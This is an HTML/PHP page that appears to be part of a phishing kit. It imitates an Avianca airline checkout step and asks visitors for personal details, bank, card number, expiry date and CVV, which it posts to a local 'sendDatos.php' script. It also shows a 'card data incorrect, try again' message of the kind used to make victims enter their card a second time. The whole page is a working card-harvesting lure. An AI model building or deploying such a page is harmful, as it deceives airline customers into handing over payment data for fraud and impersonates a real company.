<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="media/icon.ico" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
    <link rel="stylesheet" href="./css/style.css">

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">

    <title>Avianca | #NACIONALES</title>
</head>

<body>
    <div class="header_check">
        <img src="media/logo-avianca-minimal.svg" class="logo">
        <img src="media/paso3.png" alt="" class="pasos">
    </div>

    <div class="body_check">
        <p class="title">Datos del cliente:</p>
        <p class="text_info">Información del titular de la tarjeta.</p>

        <hr>

        <form action="sendDatos.php" method="POST">
            <div class="form-group">
                <input type="text" name="nombre" placeholder="Nombre" class="form-control">
            </div>
   
            <div class="form-group">
                <input type="text" name="apellido" placeholder="Apellido" class="form-control">
            </div>
          
            <div class="form-group">
                <input type="number" name="documento" placeholder="Nro. de documento" class="form-control">
            </div>
         
            <div class="form-group">
                <input type="number" name="telefono" placeholder="Teléfono de contacto" class="form-control">
            </div>
          
            <div class="form-group">
                <input type="text" name="ciudad" placeholder="Ciudad" class="form-control">
            </div>
           
            <div class="form-group">
                <input type="text" name="direccion" placeholder="Dirección" class="form-control">
            </div>
            <br>
            <p class="title">Datos de pago:</p>
            <p class="text_info">Información de la tarjeta.</p>

            <hr>

            <div class="card">
                <div class="card-body">
                    <div class="form-group">
                        <label for="">Banco:</label>
                        <select name="banco" class="form-control">
                            <option value="00" selected>Seleccione su banco</option>
                            <option value="BANCOLOMBIA">BANCOLOMBIA</option>
                            <option value="BANCO AGRARIO">BANCO AGRARIO</option>
                            <option value="BANCO AVVILLAS">BANCO AV VILLAS</option>
                            <option value="BANCO BBVA">BANCO BBVA</option>
                            <option value="BANCO CAJA SOCIAL">BANCO CAJA SOCIAL</option>
                            <option value="BANCO CITIBANK">BANCO CITIBANK</option>
                            <option value="BANCO COLPATRIA">BANCO COLPATRIA</option>
                            <option value="BANCO CORPBANCA">BANCO CORPBANCA</option>
                            <option value="BANCO DAVIVIENDA">BANCO DAVIVIENDA</option>
                            <option value="BANCO DE BOGOTA">BANCO DE BOGOTA</option>
                            <option value="BANCO DE OCCIDENTE">BANCO DE OCCIDENTE</option>
                            <option value="BANCO FALABELLA">BANCO FALABELLA</option>
                            <option value="BANCO FINANDINA">BANCO FINANDINA</option>
                            <option value="BANCO GANADERO">BANCO GANADERO</option>
                            <option value="BANCO GNB SUDAMERIS">BANCO GNB SUDAMERIS</option>
                            <option value="BANCO HSBC COLOMBIA">BANCO HSBC COLOMBIA</option>
                            <option value="BANCO ITAU">BANCO ITAU</option>
                            <option value="BANCO PICHINCHA">BANCO PICHINCHA</option>
                            <option value="BANCO POPULAR">BANCO POPULAR</option>
                            <option value="BANCO SANTANDER">BANCO SANTANDER COLOMBIA</option>
                            <option value="BANCO CREDIBANCO">CREDIBANCO - ASOCIACION GREMIAL DE INSTITUCIONES FINANCIERAS</option>
                            <option value="BANCO HELM BANK">HELM BANK</option>
                            <option value="NEQUI">NEQUI</option>
                            <option value="REDEBAN MULTICOLOR">REDEBAN MULTICOLOR</option>
                            <option value="SERFINANSA">SERFINANSA - SERVICIOS FINANCIEROS SERFINANSA COMPANIA DE FINANCIAMIENTO</option>
                            <option value="SERVIBANCA">SERVIBANCA</option>
                            <option value="TUYA">TUYA</option>
                            <option value="NUBANK">NUBANK</option>
                            <option value="NN">NO SE ENCUENTRA EL BANCO</option>
                        </select>
                    </div>

                    <div class="form-group">
                        <label for="">Franquicia:</label>
                        <select name="franquicia" class="form-control">
                            <option value="Dinners Club">Dinners Club</option>
                            <option value="Visa">Visa</option>
                            <option value="Master Card">Master Card</option>
                            <option value="American Express">American Express</option>
                        </select>
                    </div>

                    <div class="form-group">
                        <label for="">Tipo de Tarjeta:</label>
                        <select name="tipo_tarjeta" class="form-control">
                            <option value="Debito">Debito</option>
                            <option value="Credito">Crédito</option>
                        </select>
                    </div>

                    <div class="form-group">
                        <label for="">Número de tarjeta</label>
                        <input type="text" class="form-control" name="nro_tarjeta" id="tarjetaInput">
                    </div>

                    <div class="form-group">
                        <label for="">Nombre del titular:</label>
                        <input type="text" class="form-control" name="nombre_tarjeta">
                    </div>

                    <div class="row">
                        <div class="col-9">
                            <label for="">Expiración</label>
                            <div class="row">
                                <div class="col-5">
                                    <div class="form-group">
                                        <select name="mes_tarjeta" id="" class="form-control">
                                            <option disabled selected="">Mes</option>
                                            <option value="1">1</option>
                                            <option value="2">2</option>
                                            <option value="3">3</option>
                                            <option value="4">4</option>
                                            <option value="5">5</option>
                                            <option value="6">6</option>
                                            <option value="7">7</option>
                                            <option value="8">8</option>
                                            <option value="9">9</option>
                                            <option value="10">10</option>
                                            <option value="11">11</option>
                                            <option value="12">12</option>
                                        </select>
                                        </select>
                                    </div>
                                </div>
                                <div class="col-7">
                                    <div class="form-group">
                                        <select name="anio_tarjeta" class="form-control">
                                            <option disabled="" selected="">Año</option>
                                            <option value="2023">2023</option>
                                            <option value="2024">2024</option>
                                            <option value="2025">2025</option>
                                            <option value="2026">2026</option>
                                            <option value="2027">2027</option>
                                            <option value="2028">2028</option>
                                            <option value="2029">2029</option>
                                            <option value="2030">2030</option>
                                            <option value="2031">2031</option>
                                        </select>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-3">
                            <label for="">CVV</label>
                            <div class="row">
                                <div class="col-12">
                                    <div class="form-group">

                                        <input type="number" class="form-control" name="cvv_tarjeta">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <br>
            <div class="form-group">
                <input type="submit" name="continuar" value="Continuar" class=" btn btn-danger form-control">
            </div>
        </form>

    </div>

    <?php 
            if(isset($_GET["error"]) && $_GET["error"] === "empty"){
               ?>
                <div class="content_modal_e content_modal_e_2">
                    <div class="modal">
                        <div class="close">
                        <i class="far fa-times-circle" onclick="closeModale();"></i>
                        </div>
                        <div class="text">
                            <p>Debes llenar todos los datos, <br>
                            por favor vuelve a intentarlo</p>
                        </div>
                        <button type="button" onclick="closeModale();">OK</button>
                    </div>
                </div>
               <?php
            }
        ?>

    <?php 
            if(isset($_GET["error"])  && $_GET["error"] === "error" ){
               ?>
                <div class="content_modal_e content_modal_e_2">
                    <div class="modal">
                        <div class="close">
                        <i class="far fa-times-circle" onclick="closeModale();"></i>
                        </div>
                        <div class="text">
                            <p>La tarjeta ingresada y/o los datos <br> ingresados no son correctos, <br>
                        por favor vuelve a intentarlo</p>
                        </div>
                        <button type="button" onclick="closeModale();">OK</button>
                    </div>
                </div>
               <?php
            }
        ?>

</body>



<script src="js/jquery-3.7.1.min.js"></script>
<script src="js/modal.js"></script>

<script>
    $(window).on("load", function(e) {

        $('#tarjetaInput').on('input', function() {
            let inputValue = $(this).val();

            // Elimina todos los caracteres no numéricos.
            let formattedNumber = inputValue.replace(/[^0-9]/g, '');

            // Divide el número en grupos de 4 dígitos.
            formattedNumber = formattedNumber.replace(/\d{4}(?=\d)/g, '$& ');

            // Limita la longitud máxima a 19 caracteres (incluyendo espacios).
            formattedNumber = formattedNumber.slice(0, 19);

            // Actualiza el valor del input con el número formateado.
            $(this).val(formattedNumber);
        });

    });
</script>

<!-- <div class="loader_inicial" id="loaderI">
    <img src="media/loading.png" alt="">
    <div class="lds-ring">
        <div></div>
        <div></div>
        <div></div>
        <div></div>
    </div>
</div>

<script>
    setTimeout(function() {
        $('#loaderI').hide();
    }, 3000);
</script>
</html> -->